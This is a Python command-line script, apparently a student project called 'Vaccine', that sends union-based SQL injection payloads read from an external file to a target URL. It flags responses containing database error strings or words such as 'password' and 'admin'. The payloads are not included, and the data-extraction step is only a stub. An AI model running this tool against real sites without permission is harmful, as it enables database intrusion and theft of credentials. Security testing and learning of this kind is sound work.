import sys
import argparse
import requests


def sensitive(response, payload):
    """
    Analyze the response to determine if the SQLi was successful.
    """
    sensitive_keywords = [
            "admin",
            "user",
            "password",
            "login",
            "table",
            ]

    for keyword in sensitive_keywords:
        if keyword.lower() in response.text.lower():
            print(f"[!] Sensitive data found with payload: {payload}")
            print(f"[!] Keyword: {keyword}")
            return True


def detect_success(response, payload):
    """
    Analyze the response to determine if the SQLi was successful.
    """
    error_indicators = [
            "SQL syntax",
            "Warning",
            "mysql_",
            "ORA-",
            "PostgreSQL",
            "SQLSTATE",
            "You have an error in your SQL syntax",
            "Unclosed quotation mark",
            "quoted string not properly terminated",
            "unterminated string literal",
            "syntax error"
            ]
    for indicator in error_indicators:
        if indicator.lower() in response.text.lower():
            print(f"[!] Potential vulnerabitilty detected with payload: {payload}")
            return True

    return False


def analyze_vulnerability(file, http_method, url, payload):
    """
    Analyze a vulnerable site and extract sensitive data.
    """
    print(f"[+] Analyzing vulnerability with payload: {payload}")
    response = make_request(file, http_method, url, payload)
    if detect_success(response, payload):
        print("[+] Extracting sensitive data...")


def make_request(file, http_method, url, payload):
    try:
        if http_method == "GET":
            response = requests.get(url, params=payload)
            response.raise_for_status()
        elif http_method == "POST":
            response = requests.post(url, params=payload)
            response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error: Invalid URL: '{url}': {e}")
        sys.exit(1)
    return response


def create_payload(file, http_method, url):
    print(f"Output file: {output_file}")
    print(f"HTTP method: {http_method}")
    print(f"Target URL: {target_url}")
    #error_based = "error_based_payload.txt"
    union_based = "union_based_payload.txt"
    #print("Starting error-based SQL Injection...")
    #with open(error_based, "r") as error_based_payload:
        #for line in error_based_payload:
            #make_request(file, http_method, url, line.strip())
    print("Starting union-based SQL Injection...")
    with open(union_based, "r") as union_based_payload:
        for line in union_based_payload:
            analyze_vulnerability(file, http_method, url, line.strip())


if __name__ == '__main__':
    default_file = "data.txt"
    if len(sys.argv) < 2:
        print("Please provide a valid input.")
        print("./vaccine [-oX] URL")
        print(" -o: Archive file.")
        print(" -X: Type of request.")
        sys.exit(1)
    parser = argparse.ArgumentParser(
        description="Vaccine SQL Injection",)
    parser.add_argument(
        '-o', '--output', help="Output file", default=default_file)
    parser.add_argument(
            '-X', '--request', help="HTTP request method", default="GET")
    parser.add_argument(
        'url', help="Target URL for SQL Injection")
    args = parser.parse_args()
    output_file = args.output
    request_method = args.request.upper()
    target_url = args.url
    create_payload(output_file, request_method, target_url)
